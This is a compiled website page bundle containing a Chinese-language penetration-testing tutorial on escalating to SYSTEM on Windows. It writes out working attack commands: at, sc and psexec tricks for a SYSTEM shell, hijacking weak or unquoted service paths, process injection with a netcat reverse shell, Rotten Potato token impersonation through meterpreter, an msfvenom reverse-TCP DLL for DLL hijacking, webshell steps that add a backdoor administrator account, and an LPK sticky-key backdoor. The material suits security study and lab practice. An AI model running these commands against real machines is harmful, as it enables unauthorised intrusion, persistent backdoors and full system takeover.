import{_ as c,p as l,q as r,s,R as e,t,a3 as d,Z as a,n as i}from"./framework-47a2e622.js";const p="/images/image20210518104242.png",h="/images/image20210518104504.png",k="/images/image20210518104544.png",u="/images/image20210518104551.png",m="/images/image20210518152734.png",x="/images/image20210518151547.png",g="/images/image20210521151718.png",b="/images/image20210521151956.png",w={},v=a('<h2 id="系统权限" tabindex="-1"><a class="header-anchor" href="#系统权限" aria-hidden="true">#</a> 系统权限</h2><blockquote><p>system &gt; administrator &gt; users &gt; webshell &gt; guest</p></blockquote><h2 id="本地提权" tabindex="-1"><a class="header-anchor" href="#本地提权" aria-hidden="true">#</a> 本地提权</h2><h3 id="at-命令提权" tabindex="-1"><a class="header-anchor" href="#at-命令提权" aria-hidden="true">#</a> AT 命令提权</h3><p>at 命令提权的原理：at 命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用的是 system 权限。</p>',5),_=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"适用版本"),s("ul",{class:"contains-task-list"},[s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows2000")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows2003")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" WindowsXP")])])],-1),f=a(`<p>当我们拿到一个低权限的用户，通过 3389 端口远程连接上后，可以通过 at 命令来进行本地提权。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>at <span class="token number">12</span>:31 /interactive cmd <span class="token punctuation">(</span>在19：39分生成一个交互式的 System 权限的 cmd<span class="token punctuation">)</span>
</code></pre></div><p><img src="`+p+'" alt=""></p><h3 id="sc-命令提权" tabindex="-1"><a class="header-anchor" href="#sc-命令提权" aria-hidden="true">#</a> SC 命令提权</h3><p>SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p>',5),y=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"适用版本"),s("ul",{class:"contains-task-list"},[s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows 7/8/03/08/12/16")])])],-1),W=a(`<div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 这个命令的意思是创建一个名叫syscmd的新的交互式的cmd服务</span>
sc Create syscmd <span class="token assign-left variable">binPath</span><span class="token operator">=</span> <span class="token string">&quot;cmd /K start&quot;</span> <span class="token assign-left variable">type</span><span class="token operator">=</span> own <span class="token assign-left variable">type</span><span class="token operator">=</span> interact
<span class="token comment"># 然后执行</span>
sc start syscmd  <span class="token comment"># 就得到了一个system权限的cmd环境</span>
</code></pre></div><h3 id="pc-命令提权" tabindex="-1"><a class="header-anchor" href="#pc-命令提权" aria-hidden="true">#</a> PC 命令提权</h3>`,2),q={href:"https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools",target:"_blank",rel:"noopener noreferrer"},S=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"适用版本"),s("ul",{class:"contains-task-list"},[s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows2003")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows2008")])])],-1),M=a('<p>包含工具目录：</p><p><img src="'+h+`" alt=""></p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-d</span> notepad.exe
</code></pre></div><p>在 windows2008 中：</p><p><img src="`+k+'" alt=""></p><p><img src="'+u+'" alt=""></p><h2 id="不安全的服务权限配置" tabindex="-1"><a class="header-anchor" href="#不安全的服务权限配置" aria-hidden="true">#</a> 不安全的服务权限配置</h2><h3 id="原理" tabindex="-1"><a class="header-anchor" href="#原理" aria-hidden="true">#</a> 原理</h3><p>及时正确引用了服务器路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多权限，例如，可以直接修改它导致重定向执行文件关键在于利用当前用户可以操作的服务。</p><h3 id="提权" tabindex="-1"><a class="header-anchor" href="#提权" aria-hidden="true">#</a> 提权</h3>',10),C={href:"https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk",target:"_blank",rel:"noopener noreferrer"},T=a(`<div class="language-bash" data-ext="sh"><pre class="language-bash"><code>accesschk.exe <span class="token parameter variable">-uwcqv</span> <span class="token string">&quot;administrator&quot;</span> * <span class="token comment">#检测用户administrator可以操作的服务项，用户名可以替换成user</span>
sc config <span class="token string">&quot;NewServiceName&quot;</span> <span class="token assign-left variable">binpath</span><span class="token operator">=</span><span class="token string">&quot;C:<span class="token entity" title="\\t">\\t</span>est.exe&quot;</span> <span class="token comment">#将服务执行的路径替换成提权文件</span>
sc start <span class="token string">&quot;NewServiceName&quot;</span> <span class="token comment">#重新开启服务</span>
</code></pre></div>`,1),I={class:"custom-container warning"},N=s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8v4"}),s("path",{d:"M12 16h.01"})])],-1),j=s("p",{class:"custom-container-title"},"注意",-1),B=a(`<h2 id="不带引号服务路径" tabindex="-1"><a class="header-anchor" href="#不带引号服务路径" aria-hidden="true">#</a> 不带引号服务路径</h2><h3 id="原理-1" tabindex="-1"><a class="header-anchor" href="#原理-1" aria-hidden="true">#</a> 原理</h3><p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按照字面解释它并执行，但是，如果服务的二进制路径未包含在引号中，则操作系统会执行找到空格分隔的服务路径的第一个实例。</p><h3 id="提权-1" tabindex="-1"><a class="header-anchor" href="#提权-1" aria-hidden="true">#</a> 提权</h3><ol><li>检测引号服务路径：</li></ol><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>wmic <span class="token function">service</span> get name,displayname,pathname,startmode <span class="token operator">|</span>findstr /i <span class="token string">&quot;Auto&quot;</span> <span class="token operator">|</span>findstr /i /v <span class="token string">&quot;C:\\Windows<span class="token entity" title="\\\\">\\\\</span>&quot;</span> <span class="token operator">|</span>findstr /i /v <span class="token string">&quot;&quot;</span>&quot;
</code></pre></div><ol start="2"><li>利用路径制作文件并上传。</li><li>启用服务或重启<code>sc start &quot;服务名&quot;</code>。</li><li>利用 msf 监听，实现提权。</li></ol><h2 id="进程注入" tabindex="-1"><a class="header-anchor" href="#进程注入" aria-hidden="true">#</a> 进程注入</h2><h3 id="原理-2" tabindex="-1"><a class="header-anchor" href="#原理-2" aria-hidden="true">#</a> 原理</h3><p>注入到<code>system</code>用户的进程，当管理员账户或其他账户注销后，后门仍然存在。可以理解为将<code>pinjector</code>注入到其他用户的进程里一起运行，进而同时拥有了对应的权限。</p>`,10),E=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"适用版本"),s("ul",{class:"contains-task-list"},[s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" pinjector 进程注入工具针对-Windows2008以前的操作系统")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" pexec64 32 进程注入工具针对-Windows2008及以后的操作系统")])])],-1),V=a(`<h2 id="提权-2" tabindex="-1"><a class="header-anchor" href="#提权-2" aria-hidden="true">#</a> 提权</h2><p>使用工具列出当前操作系统的所有进程：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>pinjector.exe <span class="token parameter variable">-l</span>
</code></pre></div><p><img src="`+m+`" alt=""></p><p>可以看到不同的进程对应不同 PID 和用户。</p><p>执行：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>pinjector.exe <span class="token parameter variable">-p</span> <span class="token number">600</span> cmd <span class="token number">2345</span>
</code></pre></div><p>注入进程<code>pid</code>为<code>600</code>的进程，使用端口<code>2345</code>返回<code>cmd</code>，执行成功后在任务管理器里并没有多出进程，使用 kali：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">nc</span> <span class="token number">192.168</span>.70.135 <span class="token number">2345</span>
</code></pre></div><p>反弹 shell 并提权为 system。</p>`,10),P=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"Windows2003&10"),s("p",null,"进程注入提权是本地提权方式的一种较为老的安全技术了，利用的是注入进程的所有者实现权限共享机制，这类技术主要利用在 Windows2008 之前操作系统上.所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统。")],-1),A=a(`<h2 id="烂土豆配合令牌窃取" tabindex="-1"><a class="header-anchor" href="#烂土豆配合令牌窃取" aria-hidden="true">#</a> 烂土豆配合令牌窃取</h2><h3 id="原理-3" tabindex="-1"><a class="header-anchor" href="#原理-3" aria-hidden="true">#</a> 原理</h3><p>烂土豆(Rotten Potato)提权是一个本地提权，是针对本地用户的，不能用于域用户。漏洞了解：MS16-075。</p><ol><li>欺骗“NT AUTHORITY\\SYSTEM”账户通过 NTLM(NTLM 是指 telnet 的一种验证身份方式，即问询/应答身份验证协议，是 Windows NT 早期版本的标准安全协议)认证到我们控制的 TCP 终端。</li><li>对这个认证过程使用中间人攻击（NTLM 重放），为“NT AUTHORITY\\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的 Windows API 调用实现的。</li><li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限（一定是要服务型用户）。</li></ol><p>所以，一般从 web 拿到的 webshell 都是 IIS 服务器权限，是具有这个模仿权限的。</p><h3 id="提权-3" tabindex="-1"><a class="header-anchor" href="#提权-3" aria-hidden="true">#</a> 提权</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>msf
upload /root/potato.exe c:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>Public
<span class="token builtin class-name">cd</span> c:<span class="token punctuation">\\</span><span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span><span class="token punctuation">\\</span>Public
use incognito
list_tokens <span class="token parameter variable">-u</span>
execute <span class="token parameter variable">-cH</span> <span class="token parameter variable">-f</span> potato.exe
list_tokens <span class="token parameter variable">-u</span>
impersonate_token <span class="token string">&quot;NT AUTHORITY<span class="token entity" title="\\\\">\\\\</span>SYSTEM&quot;</span>
</code></pre></div><h2 id="令牌窃取" tabindex="-1"><a class="header-anchor" href="#令牌窃取" aria-hidden="true">#</a> 令牌窃取</h2><h3 id="原理-4" tabindex="-1"><a class="header-anchor" href="#原理-4" aria-hidden="true">#</a> 原理</h3><p>进行远程过程调用时请求提升权限，然后调用它从而生成特权安全令牌以执行特权操作。当系统允许令牌不仅用于进程本身，还用于原始请求进程时，漏洞就会出现。</p>`,10),L=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"适用版本"),s("ul",{class:"contains-task-list"},[s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows xp professional sp3 和之前的版本")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows server 2003 sp2 和之前的版本")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows server 2003 x64 和 x64 sp2")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows server 2003（用于基于Itanium的系统sp2和之前的版本）")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows server 2008 x32 x64")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows server 2008（用于基于Itanium的系统）")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows Vista sp1 和之前的版本")]),s("li",{class:"task-list-item"},[s("input",{class:"task-list-item-checkbox",checked:"",disabled:"",type:"checkbox"}),e(" Windows Vista x64 sp1 和之前的版本")])])],-1),Y=a(`<h3 id="提权-4" tabindex="-1"><a class="header-anchor" href="#提权-4" aria-hidden="true">#</a> 提权</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>user incognito
list_tokens <span class="token parameter variable">-u</span>
impersonate_token <span class="token string">&quot;NT AUTHORITY\\SYSTEM&quot;</span>
</code></pre></div><h3 id="kerberos-协议" tabindex="-1"><a class="header-anchor" href="#kerberos-协议" aria-hidden="true">#</a> Kerberos 协议</h3><p>在假冒令牌攻击中需要使用<strong>kerberos</strong>协议，所以在使用假冒令牌前，先来介绍 kerberos 协议。kerberos 是一种网络认证协议，其设计目标是通过密钥系统为客户机/服务器应用程序提供强大的认证服务。</p><p><img src="`+x+`" alt=""></p><p>客户端请求证书的过程如下：</p><ol><li>客户端向认证服务器 AS 发送请求，要求得到服务器的证书。</li><li>AS 收到请求后，将包含客户端密钥的加密证书响应发送给客户端，该证书包括服务器 ticket（包括服务器密钥加密的客户机身份和一份会话密钥）和一个临时加密密钥（又称会话密钥，session key）当然，认证服务器也会给服务器发送一份该证书，用来使服务器认证登陆客户端的身份。</li><li>客户端将 ticket 传送到服务器上，服务器确认该客户端的话，便允许它登陆服务器。</li><li>客户端登陆成功后，攻击者就可以通过入侵服务器获取客户端的令牌。</li></ol><h2 id="dll-劫持" tabindex="-1"><a class="header-anchor" href="#dll-劫持" aria-hidden="true">#</a> Dll 劫持</h2><h3 id="原理-5" tabindex="-1"><a class="header-anchor" href="#原理-5" aria-hidden="true">#</a> 原理</h3><p>Windows 程序启动的时候需要 dll。如果这些 dll 不存在，则可以通过在应用程序要查找的位置防止恶意的 dll 来提权。通常，Windows 应用程序有其预定义好的搜索 dll 的路径，它会根据下面的顺序进行搜索：</p><ol><li>应用程序加载目录</li><li>C:\\windows\\System32</li><li>C:\\windows\\System</li><li>C:\\windows</li></ol><h3 id="提权-5" tabindex="-1"><a class="header-anchor" href="#提权-5" aria-hidden="true">#</a> 提权</h3><ul><li>信息收集：收集服务器中有哪些第三方运行的程序。</li><li>进程调试：在本地搭建环境，查找该程序在运行的时候调用了哪些dll，注意，这些dll不能是系统的dll。</li><li>制作名字相同的dll并上传替换。</li><li>重新启动应用，即可达到提权。</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span>x.x.x.x <span class="token assign-left variable">lport</span><span class="token operator">=</span>xxxx <span class="token parameter variable">-f</span> dll <span class="token operator">&gt;</span> /opt/shell.dll
</code></pre></div><h2 id="溢出漏洞" tabindex="-1"><a class="header-anchor" href="#溢出漏洞" aria-hidden="true">#</a> 溢出漏洞</h2><h3 id="信息收集" tabindex="-1"><a class="header-anchor" href="#信息收集" aria-hidden="true">#</a> 信息收集</h3><p>利用 RCE 查看 systeminfo，使用项目查找漏洞提权。</p><h3 id="工具利用" tabindex="-1"><a class="header-anchor" href="#工具利用" aria-hidden="true">#</a> 工具利用</h3>`,18),R={href:"https://github.com/bitsadmin/wesng",target:"_blank",rel:"noopener noreferrer"},O={href:"https://github.com/vulmon/Vulmap",target:"_blank",rel:"noopener noreferrer"},U={href:"https://github.com/chroblert/WindowsVulnScan",target:"_blank",rel:"noopener noreferrer"},H=a(`<h3 id="命令提权" tabindex="-1"><a class="header-anchor" href="#命令提权" aria-hidden="true">#</a> 命令提权</h3><p>下载 pstools，使用命令提权：</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>psexec.exe <span class="token parameter variable">-accepteula</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-i</span> <span class="token parameter variable">-d</span> notepad.exe <span class="token comment"># (nodepad.exe--&gt;cmd.exe)</span>
</code></pre></div>`,3),D=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"示例"),s("p",null,[e("Windows server 2008 r2 溢出漏洞提权 => "),s("code",null,"CVE-2014-4113")])],-1),K=a(`<h2 id="asp-提权" tabindex="-1"><a class="header-anchor" href="#asp-提权" aria-hidden="true">#</a> asp 提权</h2><blockquote><p>在 IIS 里，权限大小依次是 aspx &gt; php &gt;=asp。</p></blockquote><p>aspx 默认能执行终端命令。</p><h3 id="提权-6" tabindex="-1"><a class="header-anchor" href="#提权-6" aria-hidden="true">#</a> 提权</h3><p>得到 webshell 后查看是否存在组件 wscript.shell，如果存在，上传 cmd 至可执行目录，一般上传至回收站目录，即 c:\\recycler,然后上传溢出漏洞 exp，如 iis6.exe,然后在 cmd 中执行该程序，带上参数，如ipconfig，最后创建一个用户，并将该用户放入管理员组。</p><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token string">&quot;net user lhj lhj /add &amp; net localgroup administrator lhj /add&quot;</span>
</code></pre></div><p>登录后即提权成功。</p><h2 id="aspx-提权" tabindex="-1"><a class="header-anchor" href="#aspx-提权" aria-hidden="true">#</a> aspx 提权</h2><p>aspx 程序的权限比 asp 高（aspx 使用的是<code>.net</code>技术，IIS 默认不支持，aspnet 属于 user 组，asp 一般是 guest 权限），默认可以执行 cmd，如果 asp 不能执行，则上传 aspx 的程序至服务器实现提权。</p><h2 id="lpk-劫持提权" tabindex="-1"><a class="header-anchor" href="#lpk-劫持提权" aria-hidden="true">#</a> LPK 劫持提权</h2><h3 id="原理-6" tabindex="-1"><a class="header-anchor" href="#原理-6" aria-hidden="true">#</a> 原理</h3><p>如果同一个目录中存在 exe 和 lpk.dll 每当 exe 执行的时候就会被劫持。利用这个特性 可以把 lpk 提权的文件放到权限较高的程序 ，当 exe 运行时，lpk.dll 就可以进行提权。</p><h3 id="触发条件" tabindex="-1"><a class="header-anchor" href="#触发条件" aria-hidden="true">#</a> 触发条件</h3><p>目录下存在 exe 文件被执行，他的特点是每个可执行文件运行之前都要加载该文件，Windows 系统是先判断当前文件目录是否存在此文件，如果目录下存在该文件则执行,如果不存在则会执行 system32 目录下的 dll。</p>`,14),z=s("div",{class:"custom-container tip"},[s("svg",{xmlns:"http://www.w3.org/2000/svg","xmlns:xlink":"http://www.w3.org/1999/xlink",viewBox:"0 0 24 24"},[s("g",{fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round"},[s("circle",{cx:"12",cy:"12",r:"9"}),s("path",{d:"M12 8h.01"}),s("path",{d:"M11 12h1v4h1"})])]),s("p",{class:"custom-container-title"},"提示"),s("p",null,"lpk.dll 病毒是当下比较流行的一类病毒，而正常系统本身也会存在 lpk.dll 文件，这足以说明这类病毒的危险性。系统本身的 lpk.dll 文件位于 C:\\WINDOWS\\system32和C:WINDOWS\\system\\dllcache 目录下。")],-1),Q=s("h3",{id:"提权-7",tabindex:"-1"},[s("a",{class:"header-anchor",href:"#提权-7","aria-hidden":"true"},"#"),e(" 提权")],-1),X=s("p",null,[e("使用"),s("code",null,"T00ls Lpk Sethc v4"),e("工具生成 lpk.dll,将该文件利用 webshell 上传至 system 权限运行的程序中，设置热键：")],-1),Z=s("p",null,[s("img",{src:g,alt:""})],-1),F=s("p",null,"相当于劫持了粘滞键。",-1),G=s("p",null,"等待用户重启服务器，再利用远程连接，按住 shift 键五次，弹出粘滞键窗口，同时按住 ctrl 键、a键、b键，输入密码即可获取后门：",-1),J=s("p",null,[s("img",{src:b,alt:""})],-1);function $(ss,es){const n=i("ExternalLinkIcon"),o=i("font");return l(),r("div",null,[v,_,f,y,W,s("p",null,[e("微软官方工具包： "),s("a",q,[e("https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools"),t(n)])]),S,M,s("p",null,[e("accesschk.exe 是微软官方文件，可以去官网直接下载："),s("a",C,[e("https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk"),t(n)])]),T,s("div",I,[N,j,s("p",null,[e("如果出现"),t(o,{color:"red"},{default:d(()=>[e("Invalid account name:user")]),_:1}),e("，此提权方法则无效")])]),B,E,V,P,A,L,Y,s("p",null,[e("wesng："),s("a",R,[e("https://github.com/bitsadmin/wesng"),t(n)]),e(" (可以用于web权限)")]),s("p",null,[e("vulmap："),s("a",O,[e("https://github.com/vulmon/Vulmap"),t(n)]),e(" (不适合web权限)")]),s("p",null,[e("windowsvulnscan："),s("a",U,[e("https://github.com/chroblert/WindowsVulnScan"),t(n)])]),H,D,K,z,Q,X,Z,F,G,J])}const ts=c(w,[["render",$],["__file","permissionEscalation.html.vue"]]);export{ts as default};
